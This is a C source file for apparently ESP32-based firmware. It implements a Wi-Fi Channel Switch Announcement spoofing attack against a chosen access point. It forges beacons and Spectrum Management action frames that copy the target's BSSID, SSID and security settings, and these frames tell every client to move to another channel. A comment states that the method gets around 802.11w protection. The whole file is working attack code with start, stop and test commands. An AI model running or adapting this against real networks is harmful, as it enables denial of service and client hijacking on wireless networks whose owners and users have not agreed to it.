// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 XDUPWW

// CSA 伪造：用带 CSA IE 的 beacon（和/或 Spectrum Management action）命令
// 整个 BSS 换信道。Beacon 不受 PMF 保护，这是它绕过 802.11w 的原因。

#include <string.h>

#include "attacks/attack.h"
#include "attacks/attack_common.h"
#include "hal_wifi/hal_wifi.h"
#include "wbus/wbus.h"
#include "wifi_frame/frame_build.h"
#include "wifi_frame/frames.h"
#include "wifi_frame/ie_build.h"
#include "wifi_frame/ie_parse.h"
#include "wtarget/wtarget.h"

#define OWNER "csa"
#define CATEGORY_SPECTRUM 4
#define ACTION_CSA 4
#define BEACON_INTERVAL 100

typedef enum {
    PHASE_ANNOUNCE = 0,
    PHASE_HOLD = 1,
} csa_phase_t;

static bool s_active;
static uint8_t s_bssid[6];
static uint8_t s_ap_channel;
static uint8_t s_new_channel;
static uint8_t s_count;
static uint8_t s_left;      // 还剩几次公告
static uint32_t s_secs;
static bool s_send_beacon = true;
static bool s_send_action = true;
static csa_phase_t s_phase;
static uint32_t s_phase_ms;
static bool s_toggle;
static uint32_t s_frames;
static uint32_t s_beacons;
static uint32_t s_actions;
static uint32_t s_cycles;
static char s_ssid[33];
static bool s_sae;
static bool s_mfpr;

static uint8_t pick_channel(uint8_t current) {
    // 2.4G 只用 1/6/11，离当前最远的那个最少和原信道重叠
    const uint8_t candidates[3] = {1, 6, 11};
    uint8_t best = 11;
    int best_gap = -1;
    for (int i = 0; i < 3; i++) {
        if (candidates[i] == current) {
            continue;
        }
        const int gap = (candidates[i] > current) ? (candidates[i] - current)
                                                 : (current - candidates[i]);
        if (gap > best_gap) {
            best_gap = gap;
            best = candidates[i];
        }
    }
    return best;
}

static int build_beacon(uint8_t *buf, size_t cap, uint8_t count) {
    uint8_t ies[160];
    wf_ie_writer_t w;
    wf_ie_begin(&w, ies, sizeof(ies));
    wf_ie_ssid(&w, s_ssid, strlen(s_ssid));
    wf_ie_rates(&w, 1, 0x0C);
    wf_ie_ds(&w, s_ap_channel);
    if (s_mfpr) {
        wf_ie_extcap_btm(&w);
    }
    // beacon 里带上和真 AP 同类的 RSN，客户端才不会因为"加密方式变了"先断
    if (s_sae) {
        wf_ie_rsn_sae(&w);
    } else {
        wf_ie_rsn_psk(&w);
    }
    wf_ie_csa(&w, s_new_channel, count);
    if (!wf_ie_ok(&w)) {
        return -1;
    }
    // ESS + privacy：和真 AP 的 beacon 一样标成加密网络，否则客户端会觉得
    // AP 突然变成开放的而直接断开
    return wf_build_beacon(buf, cap, s_bssid, 0, BEACON_INTERVAL, 0x0411, ies, wf_ie_len(&w));
}

static int build_action(uint8_t *buf, size_t cap, uint8_t count) {
    const uint8_t body[4] = {ACTION_CSA, 0, s_new_channel, count};
    static const uint8_t kBcast[6] = WF_BROADCAST_ADDR_INIT;
    return wf_build_action(buf, cap, kBcast, s_bssid, s_bssid, CATEGORY_SPECTRUM, body,
                           sizeof(body));
}

static void send_one(uint8_t count) {
    static uint8_t frame[WF_FRAME_CAP];
    // 两种公告路径交替，抓包时能同时看到 beacon 和 action
    const bool want_beacon = s_send_beacon && (!s_send_action || s_toggle);
    s_toggle = !s_toggle;

    const int len = want_beacon ? build_beacon(frame, sizeof(frame), count)
                                : build_action(frame, sizeof(frame), count);
    if (len <= 0) {
        return;
    }
    if (hal_wifi_tx(frame, (uint16_t)len) == ESP_OK) {
        s_frames++;
        if (want_beacon) {
            s_beacons++;
        } else {
            s_actions++;
        }
    }
}

static void csa_tick(uint32_t now_ms) {
    if (!s_active) {
        return;
    }
    if (s_phase == PHASE_HOLD) {
        if (now_ms - s_phase_ms < s_secs * 1000u) {
            return;
        }
        hal_wifi_channel_select(OWNER, s_ap_channel);
        s_left = s_count;
        s_phase = PHASE_ANNOUNCE;
        s_cycles++;
        return;
    }

    // 公告阶段：count 从设定值一路降到 1，和真 AP 的倒计时形状一致
    send_one(s_left);
    if ((int)s_left > 1) {
        s_left--;
        return;
    }
    // 公告发完就跳过去待着，让"新信道上确实有东西"这件事成立
    hal_wifi_channel_select(OWNER, s_new_channel);
    s_phase = PHASE_HOLD;
    s_phase_ms = now_ms;
    s_left = s_count;
}

static const wb_policy_t kStartPolicy[] = {
    {.name = "idx", .type = WB_T_IDX, .required = true, .min = 1, .max = WT_MAX_ENTRIES},
    {.name = "ch", .type = WB_T_CHANNEL, .required = false, .min = 0, .max = 196, .def = 0},
    {.name = "count", .type = WB_T_U32, .required = false, .min = 2, .max = 8, .def = 5},
    {.name = "secs", .type = WB_T_U32, .required = false, .min = 1, .max = 120, .def = 10},
    {.name = "frame", .type = WB_T_STR, .required = false, .def_str = "both"},
};

static esp_err_t csa_start(wb_args_t *args, wb_reply_t *reply) {
    wt_entry_t ap;
    if (!attack_target_ap(wb_args_u32(args, "idx"), &ap)) {
        wb_reply_fail(reply, "idx 不是 AP，先跑 scan.start");
        return ESP_ERR_INVALID_ARG;
    }
    const char *frame = wb_args_str(args, "frame");
    const bool beacon = (strcmp(frame, "action") != 0);
    const bool action = (strcmp(frame, "beacon") != 0);
    if (!beacon && !action) {
        wb_reply_fail(reply, "frame 只能是 beacon / action / both");
        return ESP_ERR_INVALID_ARG;
    }

    const int channel = wb_args_channel(args, "ch");
    attack_exclusive();
    memcpy(s_bssid, ap.bssid, 6);
    s_ap_channel = ap.channel ? ap.channel : 1;
    s_new_channel = (channel > 0) ? (uint8_t)channel : pick_channel(s_ap_channel);
    if (s_new_channel == s_ap_channel) {
        wb_reply_fail(reply, "新信道和 AP 一样，等于没换");
        return ESP_ERR_INVALID_ARG;
    }
    s_count = (uint8_t)wb_args_u32(args, "count");
    s_left = s_count;
    s_secs = wb_args_u32(args, "secs");
    s_send_beacon = beacon;
    s_send_action = action;
    s_sae = ap.sae;
    s_mfpr = ap.mfpr;
    memcpy(s_ssid, ap.ssid, sizeof(s_ssid));
    s_phase = PHASE_ANNOUNCE;
    s_toggle = true;
    s_frames = 0;
    s_beacons = 0;
    s_actions = 0;
    s_cycles = 0;

    const esp_err_t err = hal_wifi_channel_acquire(OWNER, HAL_CH_ROAMING, 0, 0);
    if (err != ESP_OK) {
        wb_reply_fail(reply, "射频被占着（%s）", esp_err_to_name(err));
        return err;
    }
    hal_wifi_channel_select(OWNER, s_ap_channel);
    s_active = true;
    attack_emit("csa", true, "ch=%u->%u", (unsigned)s_ap_channel, (unsigned)s_new_channel);
    wb_reply_line(reply, "csa 开跑 %u -> %u count=%u secs=%u frame=%s", (unsigned)s_ap_channel,
                  (unsigned)s_new_channel, (unsigned)s_count, (unsigned)s_secs, frame);
    return ESP_OK;
}

static void csa_stop(void) {
    if (!s_active) {
        return;
    }
    s_active = false;
    attack_unpin(OWNER);
    attack_emit("csa", false, NULL);
}

static esp_err_t csa_stop_cmd(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    const uint32_t frames = s_frames;
    const uint32_t cycles = s_cycles;
    csa_stop();
    attack_report_rate(reply, "csa", frames);
    wb_reply_line(reply, "beacon=%u action=%u cycles=%u", (unsigned)s_beacons, (unsigned)s_actions, (unsigned)cycles);
    return ESP_OK;
}

static esp_err_t csa_test(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    uint8_t frame[WF_FRAME_CAP];
    if (s_new_channel == 0) {
        s_new_channel = 11;
        s_ap_channel = 1;
    }
    int len = build_beacon(frame, sizeof(frame), s_count ? s_count : 5);
    if (len <= 0) {
        wb_reply_fail(reply, "beacon 组帧失败");
        return ESP_FAIL;
    }
    size_t body = 0;
    const uint8_t *csa = wf_ie_find(frame + 36, (size_t)(len - 36), WF_IE_CSA, &body);
    uint8_t channel = 0;
    uint8_t count = 0;
    const bool parsed = wf_csa_parse(csa, body, &channel, &count);
    wb_reply_line(reply, "beacon len=%d csa=%d ch=%u count=%u", len, parsed ? 1 : 0,
                  (unsigned)channel, (unsigned)count);

    len = build_action(frame, sizeof(frame), 5);
    if (len <= 0) {
        wb_reply_fail(reply, "action 组帧失败");
        return ESP_FAIL;
    }
    wb_reply_line(reply, "action len=%d cat=%u act=%u ch=%u", len, frame[24], frame[25],
                  (unsigned)frame[27]);
    return ESP_OK;
}

static const wb_method_t kMethods[] = {
    {"start", csa_start, "idx=1..64 [ch=auto|1..196] [count=2..8] [secs=1..120] [frame=beacon|action|both]",
     kStartPolicy, 5},
    {"stop", csa_stop_cmd, "", NULL, 0},
    {"test", csa_test, "", NULL, 0},
};

static const wb_object_t kObject = {
    .name = "csa",
    .title = "CSA",
    .methods = kMethods,
    .n_methods = sizeof(kMethods) / sizeof(kMethods[0]),
};

static uint32_t csa_frames(void) {
    return s_frames;
}

static bool csa_active(void) {
    return s_active;
}

static const attack_driver_t kDriver = {
    .name = "csa",
    .object = &kObject,
    .stop = csa_stop,
    .tick = csa_tick,
    .frames = csa_frames,
    .active = csa_active,
};

const attack_driver_t *csa_attack(void) {
    return &kDriver;
}
